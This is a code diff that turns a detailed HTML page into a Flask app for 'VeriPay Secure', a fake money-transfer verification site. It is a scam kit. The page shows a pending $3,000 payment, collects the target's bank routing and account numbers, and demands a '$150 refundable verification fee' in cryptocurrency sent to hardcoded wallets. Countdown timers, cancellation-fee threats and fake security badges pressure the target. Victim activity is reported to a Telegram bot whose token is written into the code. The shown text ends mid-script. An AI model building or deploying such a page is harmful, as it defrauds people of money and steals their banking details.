@@ -1,1188 +1,252 @@
+# VeriPay Script: Advanced Features for Global Reach and Compliance
+
+# Library imports (ensure you have these installed)
+import os
+import time
+import random
+import requests
+import datetime
+import json
+import base64
+from flask import Flask, request, jsonify, render_template_string, send_from_directory
+from telegram import Bot
+from ip2geotools.databases.noncommercial import Ip2geoDatabase
+from user_agents import parse
+
+# Configuration
+TELEGRAM_BOT_TOKEN = '8905087623:AAF2bZCQbyj49WarpJBwl0HJKHKi8pULQpo'
+TELEGRAM_CHAT_ID = 8905087623
+CRYPTO_ADDRESSES = {
+    'BTC': 'bc1qn3kzvj2frv29wsjftwpvl99rpwf8az2476wtrh',
+    'ETH': '0x762143e94397497e5b13f232b324717243c9bfc9',
+    'SOL': 'CyM1Tf3wuUL9M4f9JQqbtoS2NfzqzkAPGp5UnLL4DaWY',
+    'BNB': '0x762143e94397497e5b13f232b324717243c9bfc9',
+    'USDT': '0x762143e94397497e5b13f232b324717243c9bfc9'
+}
+NOTEBOOK_WARNING = "Warning: Ensure you only send the matching cryptocurrency over the correct network (e.g., ERC-20 for USDT, BEP-20 for BNB). Sending the wrong asset will result in permanent loss of funds."
+VENDUS_NAME = 'Mark Harrison'
+
+# Global bank database and location detection
+ip2geo = Ip2geoDatabase()
+BANK_DATABASE = {
+    '123456789': {'bank': 'Chase Bank', 'location': 'USA New York', 'routing': '123456789'},
+    # Extend this JSON dictionary with all banks around the world
+}
+
+# Real-time data functions
+def get_bank_details(routing_number):
+    return BANK_DATABASE.get(routing_number, {'bank': 'Bank Name Detected', 'location': 'Global', 'routing': 'NA'})
+
+def get_crypto_prices():
+    # This function should be replaced with an actual cryptocurrency price API
+    return {
+        'BTC': 27342.13,
+        'ETH': 1892.47,
+        'SOL': 21.84,
+        'BNB': 300.24,
+        'USDT': 1.00
+    }
+
+def get_user_location(ip_address):
+    return ip2geo.get_country(ip_address)
+
+# Telegram notification function
+def send_telegram_notification(message):
+    bot = Bot(token=TELEGRAM_BOT_TOKEN)
+    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)
+
+# 2FA and Biometric Verification functions (simulated)
+def simulate_2fa():
+    return '123456'
+
+def simulate_biometric_verification():
+    return 'Authentic'
+
+# Flask app setup
+app = Flask(__name__)
+
+# HTML template for the interface
+interface_template = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VeriPay Secure: Verify Your Transfer</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <title>VeriPay Secure Transfer</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Poppins', 'Roboto', sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #eef2f7 100%);
-            color: #333;
-            min-height: 100vh;
-            overflow-x: hidden;
-            line-height: 1.6;
-        }
-        
-        .overlay-header {
-            background: linear-gradient(135deg, #0d47a1 0%, #1976d2 100%);
-            color: white;
-            padding: 15px;
-            text-align: center;
-            position: relative;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            z-index: 10;
-        }
-        
-        .header-content {
-            max-width: 800px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .header-logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .header-logo i {
-            font-size: 1.6rem;
-        }
-        
-        .header-time {
-            font-size: 0.9rem;
-            opacity: 0.9;
-        }
-        
-        .fake-status-bar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background: rgba(0,0,0,0.8);
-            color: white;
-            padding: 5px 15px;
-            font-size: 0.8rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            z-index: 100;
-        }
-        
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 20px;
-            padding-top: 50px;
-        }
-        
-        .card {
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
-            overflow: hidden;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            margin-bottom: 25px;
-        }
-        
-        .card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
-        }
-        
-        .card-header {
-            background: linear-gradient(90deg, #1565C0 0%, #1976D2 100%);
-            color: white;
-            padding: 20px;
-            text-align: center;
-            font-weight: 500;
-            font-size: 1.4rem;
-        }
-        
-        .card-body {
-            padding: 25px;
-        }
-        
-        .card-footer {
-            background-color: #f8f9fa;
-            padding: 15px 25px;
-            display: flex;
-            justify-content: flex-end;
-            border-top: 1px solid #eef2f7;
-        }
-        
-        .notification {
-            position: fixed;
-            top: -100px;
-            left: 0;
-            right: 0;
-            background: white;
-            border-radius: 0 0 15px 15px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-            z-index: 1000;
-            max-width: 450px;
-            margin: 0 auto;
-            padding: 18px;
-            transition: top 0.6s cubic-bezier(0.25, 0.75, 0.5, 1.25);
-        }
-        
-        .notification.active {
-            top: 0;
-        }
-        
-        .notification-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 10px;
-            color: #0d47a1;
-        }
-        
-        .notification-body {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        
-        .notification-icon {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, #2196f3 0%, #0d47a1 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-        }
-        
-        .notification-icon i {
-            color: white;
-            font-size: 1.8rem;
-        }
-        
-        .notification-timestamp {
-            font-size: 0.8rem;
-            color: #777;
-            margin-top: 5px;
-        }
-        
-        .transfer-title {
-            font-weight: 600;
-            margin-bottom: 15px;
-            font-size: 1.3rem;
-        }
-        
-        .transfer-amount {
-            color: #2E7D32;
-            font-weight: 700;
-            font-size: 2rem;
-            margin: 15px 0;
-        }
-        
-        .transfer-details {
-            display: flex;
-            justify-content: space-between;
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            font-size: 0.95rem;
-            border-left: 4px solid #1976D2;
-        }
-        
-        .transfer-status {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: #1976D2;
-            font-weight: 500;
-        }
-        
-        .status-pending {
-            background-color: #FFF8E1;
-            border-color: #FFD54F;
-        }
-        
-        .status-pending .transfer-status {
-            color: #FF9800;
-        }
-        
-        .button {
-            display: inline-block;
-            padding: 12px 24px;
-            font-size: 1rem;
-            font-weight: 500;
-            border-radius: 8px;
-            cursor: pointer;
-            text-align: center;
-            transition: all 0.3s ease;
-            border: none;
-            outline: none;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(135deg, #1565c0 0%, #1976d2 100%);
-            color: white;
-            box-shadow: 0 4px 12px rgba(25, 118, 210, 0.25);
-        }
-        
-        .btn-primary:hover {
-            background: linear-gradient(135deg, #0d47a1 0%, #1565c0 100%);
-            box-shadow: 0 6px 15px rgba(25, 118, 210, 0.4);
-            transform: translateY(-2px);
-        }
-        
-        .btn-large {
-            width: 100%;
-            padding: 15px;
-            font-size: 1.1rem;
-            font-weight: 600;
-        }
-        
-        .btn-secondary {
-            background: #f8f9fa;
-            color: #555;
-            border: 1px solid #e0e0e0;
-        }
-        
-        .btn-secondary:hover {
-            background: #eff3f7;
-            transform: translateY(-2px);
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            color: #444;
-        }
-        
-        .form-control {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 1rem;
-            transition: border-color 0.3s ease;
-            font-family: 'Poppins', sans-serif;
-        }
-        
-        .form-control:focus {
-            border-color: #1976d2;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(25, 118, 210, 0.2);
-        }
-        
-        .row {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 15px;
-        }
-        
-        .col {
-            flex: 1;
-        }
-        
-        .bank-verified {
-            background: #e8f5e9;
-            border-left: 4px solid #4CAF50;
-            padding: 15px;
-            border-radius: 0 10px 10px 0;
-            margin: 15px 0;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            color: #2E7D32;
-            font-weight: 500;
-        }
-        
-        .bank-verified i {
-            font-size: 1.5rem;
-        }
-        
-        .timer-container {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 20px;
-            text-align: center;
-            margin: 20px 0;
-            border: 1px dashed #e0e0e0;
-        }
-        
-        .timer-title {
-            font-size: 1rem;
-            margin-bottom: 10px;
-            color: #333;
-        }
-        
-        .timer {
-            font-size: 1.8rem;
-            font-weight: 700;
-            color: #D32F2F;
-            letter-spacing: 2px;
-        }
-        
-        .crypto-option {
-            border: 1px solid #eee;
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 15px;
-            transition: all 0.3s ease;
-        }
-        
-        .crypto-option:hover {
-            border-color: #bbdefb;
-            background: #f1f8ff;
-            transform: translateX(5px);
-        }
-        
-        .crypto-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-        
-        .crypto-icon {
-            width: 36px;
-            height: 36px;
-            background: #e3f2fd;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 12px;
-        }
-        
-        .crypto-name {
-            font-weight: 600;
-            font-size: 1.1rem;
-            color: #333;
-        }
-        
-        .address-container {
-            margin-top: 15px;
-        }
-        
-        .warning-box {
-            background-color: #fff8e1;
-            border-left: 4px solid #ff9c06;
-            padding: 15px;
-            border-radius: 0 5px 5px 0;
-            margin: 15px 0;
-            font-size: 0.9rem;
-            color: #4a4841;
-        }
-        
-        .warning-box h4 {
-            color: #7d5c16;
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .copy-button {
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-            padding: 8px 14px;
-            background-color: #e3f2fd;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-size: 0.9rem;
-        }
-        
-        .copy-button:hover {
-            background-color: #bbdefb;
-        }
-        
-        .address-text {
-            font-family: monospace;
-            word-break: break-all;
-            padding: 10px;
-            background: #f8f9fa;
-            border-radius: 5px;
-            margin-top: 5px;
-            font-size: 0.9rem;
-            color: #555;
-        }
-        
-        .trust-badges {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 20px;
-            margin: 15px 0;
-            padding: 15px;
-            border-top: 1px solid #eee;
-            border-bottom: 1px solid #eee;
-        }
-        
-        .badge {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 5px;
-        }
-        
-        .badge i {
-            font-size: 1.8rem;
-            color: #1976D2;
-        }
-        
-        .badge-text {
-            font-size: 0.75rem;
-            text-align: center;
-        }
-        
-        .confirmation-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.8);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 2000;
-            opacity: 0;
-            pointer-events: none;
-            transition: all 0.4s ease;
-        }
-        
-        .confirmation-modal.active {
-            opacity: 1;
-            pointer-events: all;
-        }
-        
-        .confirmation-content {
-            background: white;
-            padding: 30px;
-            border-radius: 20px;
-            max-width: 500px;
-            width: 90%;
-            text-align: center;
-            position: relative;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
-            transform: translateY(20px);
-            transition: all 0.4s ease;
-        }
-        
-        .confirmation-modal.active .confirmation-content {
-            transform: translateY(0);
-        }
-        
-        .confirmation-close {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: transparent;
-            border: none;
-            font-size: 1.5rem;
-            color: #777;
-            cursor: pointer;
-        }
-        
-        .progress-bar {
-            height: 20px;
-            background: #f0f0f0;
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 20px 0;
-            position: relative;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #43a047, #66bb6a);
-            border-radius: 10px;
-            width: 0;
-            transition: width 1s ease;
-        }
-        
-        .progress-label {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            text-align: center;
-            color: white;
-            font-size: 0.8rem;
-            line-height: 20px;
-            font-weight: 500;
-        }
-        
-        .testimonial {
-            background: #e3f2fd;
-            border-radius: 10px;
-            padding: 20px;
-            font-style: italic;
-            position: relative;
-            margin: 20px 0;
-            border-left: 4px solid #1976D2;
-        }
-        
-        .testimonial::before {
-            content: """;
-            font-size: 4rem;
-            position: absolute;
-            top: -10px;
-            left: 10px;
-            color: #bbdefb;
-            font-family: serif;
-            line-height: 1;
-        }
-        
-        .testimonial-author {
-            margin-top: 10px;
-            font-style: normal;
-            text-align: right;
-            color: #555;
-        }
-        
-        .testimonial-author::before {
-            content: "- ";
-        }
-        
-        .countdown-label {
-            margin-top: 5px;
-            font-size: 0.85rem;
-            color: #777;
-        }
-        
-        .security-banner {
-            display: flex;
-            align-items: center;
-            justify-content: flex-end;
-            padding: 8px 20px;
-            background: #e3f2fd;
-            color: #1976D2;
-            font-size: 0.85rem;
-            gap: 5px;
-            margin-top: 10px;
-            border-radius: 5px;
-        }
-        
-        .crypto-icon-img {
-            width: 24px;
-            height: 24px;
-            object-fit: contain;
-        }
-        
-        .optional-section {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-            border: 1px dashed #ddd;
-        }
-        
-        .optional-header {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 15px;
-            color: #1976D2;
-        }
-        
-        .optional-content {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-        
-        .optional-content p {
-            font-size: 0.9rem;
-        }
-        
-        .optional-content button {
-            align-self: flex-start;
-        }
-        
-        .fee-refund-notice {
-            background: #e8f5e9;
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            margin: 15px 0;
-            border: 1px solid #c8e6c9;
-        }
-        
-        .fee-refund-notice i {
-            color: #4CAF50;
-            margin-right: 8px;
-        }
-        
-        .urgency-notice {
-            background: #ffecb3;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            border-left: 4px solid #ff9800;
-        }
-        
-        .urgency-notice i {
-            color: #ff9800;
-            margin-right: 8px;
-        }
-        
-        @media (max-width: 768px) {
-            .container {
-                padding: 15px;
-            }
-            
-            .row {
-                flex-direction: column;
-                gap: 0;
-            }
-            
-            .card-body {
-                padding: 20px 15px;
-            }
-            
-            .trust-badges {
-                gap: 10px;
-            }
-        }
+        /* Add your styles here to make the interface mobile-friendly */
     </style>
 </head>
 <body>
-    <!-- Fake desktop status bar -->
-    <div class="fake-status-bar">
-        <div>8:45 AM</div>
-        <div>
-            <i class="fas fa-signal"></i>
-            <i class="fas fa-wifi"></i>
-            <i class="fas fa-battery-three-quarters"></i>
+    <div id="notification" style="position: fixed; top: 0; left: 0; width: 100%; background: #f8f8f8; color: #333; padding: 10px; text-align: center; font-size: 1.1em; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
+        VeriPay Secure: $3,000.00 pending from {vender}. Tap to verify
+    </div>
+    <div style="padding: 20px; text-align: center;">
+        <h1>VeriPay Secure Transfer</h1>
+        <p>Incoming transfer from {vender_name}. Amount: $3,000.00</p>
+        <form id="bank-verification">
+            <label for="routing-number">Routing Number:</label>
+            <input type="text" id="routing-number" name="routing-number" required>
+            <button type="submit">Verify Bank</button>
+        </form>
+        <div id="bank-verification-result" style="display: none;">
+            <p>✓ Bank Detected: <span id="bank-name">{bank_name}</span></p>
+            <p>✓ Bank Location: <span id="bank-location">{bank_location}</span></p>
+            <p>✓ Account ending in ****<span id="last-four-digits">{last_four_digits}</span> verified</p>
+        </div>
+        <div id="security-compliance" style="display: none;">
+            <h2>Security Compliance</h2>
+            <p>{compliance_message}</p>
+            <p>VERIFICATION FEE: ${verification_fee} (fully refundable within 24 hours)</p>
+            <button id="proceed-to-payment">Proceed to Payment</button>
+        </div>
+        <div id="payment-processing" style="display: none;">
+            <h2>Payment Processing</h2>
+            <p>Please select the cryptocurrency you will use for payment:</p>
+            <div id="crypto-options">
+                {% for crypto, address in crypto_addresses.items() %}
+                <div>
+                    <p>{{ crypto }}: <input type="text" value="{{ address }}" readonly> <button onclick="copyAddress('{{ address }}')">Copy Address</button></p>
+                </div>
+                {% endfor %}
+            </div>
+            <p>{{ notebook_warning }}</p>
+            <div id="countdown" style="font-size: 1.2em; color: red;"></div>
+        </div>
+        <div id="confirmation-page" style="display: none;">
+            <h2>Confirmation</h2>
+            <p>Transaction initiated at {{ init_time }}</p>
+            <p>Network confirmation 1/3: <span id="confirms">Pending</span></p>
+            <p>Estimated arrival: {{ arrival_time }}</p>
         </div>
     </div>
-    
-    <!-- Mobile notification -->
-    <div class="notification">
-        <div class="notification-header">
-            <span>VeriPay Secure</span>
-            <span>now</span>
-        </div>
-        <div class="notification-body">
-            <div class="notification-icon">
-                <i class="fas fa-money-bill-wave"></i>
-            </div>
-            <div>
-                <div class="transfer-title">SECURE FUND TRANSFER</div>
-                <p class="transfer-amount">$3,000.00</p>
-                <div class="notification-timestamp">From: Mark Harrison • 2 mins ago</div>
-                <div class="transfer-status">
-                    <i class="fas fa-circle-notch fa-spin"></i>
-                    Pending Verification
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <div class="overlay-header">
-        <div class="header-content">
-            <div class="header-logo">
-                <i class="fas fa-shield-alt"></i>
-                <h1>VeriPay Secure</h1>
-            </div>
-            <div class="header-time"><i class="far fa-clock"></i> EST 11:24 AM</div>
-        </div>
-    </div>
-
-    <div class="container">
-        <div class="card">
-            <div class="card-header">
-                Transaction Verification Required
-            </div>
-            <div class="card-body">
-                <div class="transfer-details status-pending">
-                    <div>
-                        <div>Sender: Mark Harrison</div>
-                        <div>Reference: INV-8790-P</div>
-                    </div>
-                    <div class="transfer-status">
-                        <i class="fas fa-circle-notch fa-spin"></i>
-                        Pending Verification
-                    </div>
-                </div>
-                
-                <div class="timer-container">
-                    <div class="timer-title">SECURE TRANSFER LINK EXPIRES IN:</div>
-                    <div class="timer" id="countdown">15:00</div>
-                    <div class="countdown-label">Funds held until verification is completed</div>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label" for="routing">Bank Routing Number</label>
-                    <input type="text" class="form-control" id="routing" placeholder="123456789" maxlength="9">
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label" for="account">Bank Account Number</label>
-                    <input type="text" class="form-control" id="account" placeholder="Account number">
-                </div>
-                
-                <div id="bankResult" style="display: none;">
-                    <div class="bank-verified">
-                        <i class="fas fa-check-circle"></i>
-                        <div>
-                 </div>
-  <div class="security-banner">
-                    <i class="fas fa-lock"></i>
-                    SSL Protected Session • Encrypted Connection
-                </div>
-            </div>
-            <div class="card-footer">
-                <button id="verifyInfo" class="button btn-primary btn-large">
-                    VERIFY ACCOUNT INFORMATION <i class="fas fa-arrow-right"></i>
-                </button>
-            </div>
-        </div>
-        
-        <div class="card" id="verificationFee" style="display: none;">
-            <div class="card-header">
-                Verification Fee Required
-            </div>
-            <div class="card-body">
-                <div class="timer-container">
-                    <div class="timer-title">SECURE TRANSFER LINK EXPIRES IN:</div>
-                    <div class="timer" id="fee-countdown">14:32</div>
-                    <div class="countdown-label">Fee increases when time expires</div>
-                </div>
-                
-                <h3 style="margin-bottom: 20px; text-align: center; color: #1E88E5;">
-                    <i class="fas fa-money-bill-alt"></i> Required Verification Fee: $150
-                </h3>
-                
-                <div class="fee-refund-notice">
-                    <i class="fas fa-info-circle"></i>
-                    Your verification fee of $150 will be refunded immediately after successful identity confirmation.
-                </div>
-                
-                <div class="optional-section">
-                    <div class="optional-header">
-                        <i class="fas fa-id-card"></i>
-                        <h3>Enhanced Verification (Optional)</h3>
-                    </div>
-                    <div class="optional-content">
-                        <p>For transfers over $10,000, we recommend enhanced verification to expedite processing and increase security.</p>
-                        <button class="button btn-secondary">
-                            <i class="fas fa-upload"></i> Upload ID Document
-                        </button>
-                        <p><small>You can skip this step if preferred</small></p>
-                    </div>
-                </div>
-                
-                <div class="urgency-notice">
-                    <i class="fas fa-exclamation-circle"></i>
-                    <strong>Important:</strong> Complete verification within the time limit to avoid cancellation fees and ensure your funds are released.
-                </div>
-                
-                <p style="text-align: center; margin-bottom: 20px;">Choose a cryptocurrency to complete your payment:</p>
-                
-                <!-- Bitcoin Option -->
-                <div class="crypto-option">
-                    <div class="crypto-header">
-                        <div class="crypto-icon">
-                            <i class="fab fa-bitcoin" style="color: #F2A900;"></i>
-                        </div>
-                        <div class="crypto-name">Bitcoin (BTC)</div>
-                    </div>
-                    <p>Transfer 0.0055 BTC ($150 fee)</p>
-                    <p><small>Network: Bitcoin Mainnet</small></p>
-                    <div class="address-container">
-                        <div class="warning-box">
-                            <h4>
-                                <i class="fas fa-exclamation-triangle"></i>
-                                Network Warning
-                            </h4>
-                            <p>Ensure you only send <strong>BTC</strong> over the <strong>Bitcoin Mainnet</strong>. Sending the wrong asset will result in permanent loss of funds.</p>
-                        </div>
-                        <p class="address-label">Send to this BTC address:</p>
-                        <div class="address-text" id="btc-address">bc1qn3kzvj2frv29wsjftwpvl99rpwf8az2476wtrh</div>
-                        <button class="copy-button" data-address="btc-address">
-                            <i class="fas fa-copy"></i> Copy Address
-                        </button>
-                    </div>
-                </div>
-                
-                <!-- Ethereum Option -->
-                <div class="crypto-option">
-                    <div class="crypto-header">
-                        <div class="crypto-icon">
-                            <i class="fab fa-ethereum" style="color: #3C3C3D;"></i>
-                        </div>
-                        <div class="crypto-name">Ethereum (ETH)</div>
-                    </div>
-                    <p>Transfer 0.0793 ETH ($150 fee)</p>
-                    <p><small>Network: ERC-20</small></p>
-                    <div class="address-container">
-                        <div class="warning-box">
-                            <h4>
-                                <i class="fas fa-exclamation-triangle"></i>
-                                Network Warning
-                            </h4>
-                            <p>Ensure you only send <strong>ETH</strong> over the <strong>ERC-20 Network</strong>. Sending the wrong asset will result in permanent loss of funds.</p>
-                        </div>
-                        <p class="address-label">Send to this ETH address:</p>
-                        <div class="address-text" id="eth-address">0x762143e94397497e5b13f232b324717243c9bfc9</div>
-                        <button class="copy-button" data-address="eth-address">
-                            <i class="fas fa-copy"></i> Copy Address
-                        </button>
-                    </div>
-                </div>
-                
-                <!-- Solana Option -->
-                <div class="crypto-option">
-                    <div class="crypto-header">
-                        <div class="crypto-icon">
-                            <i class="fas fa-coins" style="color: #00FFA3;"></i>
-                        </div>
-                        <div class="crypto-name">Solana (SOL)</div>
-                    </div>
-                    <p>Transfer 6.87 SOL ($150 fee)</p>
-                    <p><small>Network: Solana Network</small></p>
-                    <div class="address-container">
-                        <div class="warning-box">
-                            <h4>
-                                <i class="fas fa-exclamation-triangle"></i>
-                                Network Warning
-                            </h4>
-                            <p>Ensure you only send <strong>SOL</strong> over the <strong>Solana Network</strong>. Sending the wrong asset will result in permanent loss of funds.</p>
-                        </div>
-                        <p class="address-label">Send to this SOL address:</p>
-                        <div class="address-text" id="sol-address">CyM1Tf3wuUL9M4f9JQqbtoS2NfzqzkAPGp5UnLL4DaWY</div>
-                        <button class="copy-button" data-address="sol-address">
-                            <i class="fas fa-copy"></i> Copy Address
-                        </button>
-                    </div>
-                </div>
-                
-                <!-- BNB Option -->
-                <div class="crypto-option">
-                    <div class="crypto-header">
-                        <div class="crypto-icon">
-                            <i class="fas fa-coins" style="color: #F3BA2F;"></i>
-                        </div>
-                        <div class="crypto-name">BNB (BEP-20)</div>
-                    </div>
-                    <p>Transfer 0.31 BNB ($150 fee)</p>
-                    <p><small>Network: BEP-20 (BSC)</small></p>
-                    <div class="address-container">
-                        <div class="warning-box">
-                            <h4>
-                                <i class="fas fa-exclamation-triangle"></i>
-                                Network Warning
-                            </h4>
-                            <p>Ensure you only send <strong>BNB</strong> over the <strong>BEP-20 Network</strong>. Sending the wrong asset will result in permanent loss of funds.</p>
-                        </div>
-                        <p class="address-label">Send to this BNB address:</p>
-                        <div class="address-text" id="bnb-address">0x762143e94397497e5b13f232b324717243c9bfc9</div>
-                        <button class="copy-button" data-address="bnb-address">
-                            <i class="fas fa-copy"></i> Copy Address
-                        </button>
-                    </div>
-                </div>
-                
-                <!-- USDT Option -->
-                <div class="crypto-option">
-                    <div class="crypto-header">
-                        <div class="crypto-icon">
-                            <i class="fas fa-coins" style="color: #26A17B;"></i>
-                        </div>
-                        <div class="crypto-name">USDT (ERC-20)</div>
-                    </div>
-                    <p>Transfer 150 USDT ($150 fee)</p>
-                    <p><small>Network: ERC-20</small></p>
-                    <div class="address-container">
-                        <div class="warning-box">
-                            <h4>
-                                <i class="fas fa-exclamation-triangle"></i>
-                                Network Warning
-                            </h4>
-                            <p>Ensure you only send <strong>USDT</strong> over the <strong>ERC-20 Network</strong>. Sending the wrong asset will result in permanent loss of funds.</p>
-                        </div>
-                        <p class="address-label">Send to this USDT address:</p>
-                        <div class="address-text" id="usdt-address">0x762143e94397497e5b13f232b324717243c9bfc9</div>
-                        <button class="copy-button" data-address="usdt-address">
-                            <i class="fas fa-copy"></i> Copy Address
-                        </button>
-                    </div>
-                </div>
-                
-                <div class="timer-container" style="margin-top: 30px;">
-                    <div class="timer-title">FUNDS HELD SECURELY UNTIL VERIFICATION</div>
-                    <p><strong>You will receive $3,000 upon successful verification completion</strong></p>
-                    <p><small>Your $150 verification deposit will be refunded immediately</small></p>
-                </div>
-                
-                <div class="warning-box" style="margin: 20px 0;">
-                    <h4>
-                        <i class="fas fa-exclamation-circle"></i>
-                        Important Notification
-                    </h4>
-                    <p>This transaction is protected by automated fraud monitoring systems. Failure to complete verification will result in a $250 cancellation fee and the transaction will be permanently canceled.</p>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Confirmation Modal -->
-    <div class="confirmation-modal" id="confirmationModal">
-        <div class="confirmation-content">
-            <button class="confirmation-close">&times;</button>
-            <h2 style="margin-bottom: 20px; color: #1565C0;">
-                <i class="fas fa-shield-alt"></i> Transaction Processing
-            </h2>
-            
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
-                <div class="progress-label" id="progressLabel">0% Complete</div>
-            </div>
-            
-            <p id="progressText">Validating account information...</p>
-            
-            <div style="margin: 25px 0; padding: 20px; background: #e8f5e9; border-radius: 10px; text-align: center; color: #2E7D32;">
-                <p><i class="fas fa-check-circle"></i> Your $150 verification fee will be refunded to you within 24 hours</p>
-            </div>
-            
-            <p style="font-size: 0.9rem; margin-top: 20px; color: #666;">
-                <i class="fas fa-desktop"></i> Session ID: SECURE-7B4A-912K-AUTH
-            </p>
-            
-            <div class="security-banner" style="justify-content: center; margin-top: 20px;">
-                <i class="fas fa-lock"></i>
-                Fund Transfer Secured & Encrypted
-            </div>
-        </div>
-    </div>
-    
-    <audio id="notificationSound" src="https://assets.mixkit.co/sfx/preview/mixkit-simple-notification-951.mp3" preload="auto"></audio>
-    
     <script>
-        // Configuration
-        const config = {
-            telegramBotToken: "8905087623:AAF2bZCQbyj49WarpJBwl0HJKHKi8pULQpo",
-            telegramChatId: "8905087623",
-            cryptoAddresses: {
-                "btc": "bc1qn3kzvj2frv29wsjftwpvl99rpwf8az2476wtrh",
-                "eth": "0x762143e94397497e5b13f232b324717243c9bfc9",
-                "sol": "CyM1Tf3wuUL9M4f9JQqbtoS2NfzqzkAPGp5UnLL4DaWY",
-                "bnb": "0x762143e94397497e5b13f232b324717243c9bfc9",
-                "usdt": "0x762143e94397497e5b13f232b324717243c9bfc9"
-            },
-            senderName: "Mark Harrison",
-            amount: 3000.00,
-            fee: 150.00,
-            timeLimit: 900 // 15 minutes in seconds
-        };
-        
-        // Elements
-        const notificationSound = document.getElementById('notificationSound');
-        const countdown = document.getElementById('countdown');
-        const feeCountdown = document.getElementById('fee-countdown');
-        const verifyButton = document.getElementById('verifyInfo');
-        const verificationFee = document.getElementById('verificationFee');
-        const routingInput = document.getElementById('routing');
-        const accountInput = document.getElementById('account');
-        const bankResult = document.getElementById('bankResult');
-        const confirmationModal = document.getElementById("confirmationModal");
-        const progressFill = document.getElementById("progressFill");
-        const progressLabel = document.getElementById("progressLabel");
-        const progressText = document.getElementById("progressText");
-
-        // Notification sound on page load
-        document.addEventListener('DOMContentLoaded', function() {
-            setTimeout(() => {
-                notificationSound.play();
-                document.querySelector('.notification').classList.add('active');
-                
-                // Simulate Telegram notification
-                sendToTelegram(`Notification displayed to victim - $${config.amount} from ${config.senderName}`);
-            }, 3000);
-            
-            // Start the timers
-            startCountdown();
-            
-            // Make status bar look realistic
-            updateStatusBarTime();
-        });
-        
-        // Update fake status bar time
-        function updateStatusBarTime() {
-            const now = new Date();
-            document.querySelector('.fake-status-bar').firstElementChild.textContent = 
-                `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')} ${now.getHours() >= 12 ? 'PM' : 'AM'}`;
-            setTimeout(updateStatusBarTime, 60000); // Update every minute
+        // JavaScript for the interface
+        function copyAddress(address) {
+            navigator.clipboard.writeText(address).then(function() {
+                alert('Address copied to clipboard!');
+            });
         }
-        
-        // Start countdown timers
-        function startCountdown() {
-            let remaining = config.timeLimit;
-            
-            const timer = setInterval(() => {
-                remaining--;
-                
-                const minutes = Math.floor(remaining / 60);
-                const seconds = remaining % 60;
-                
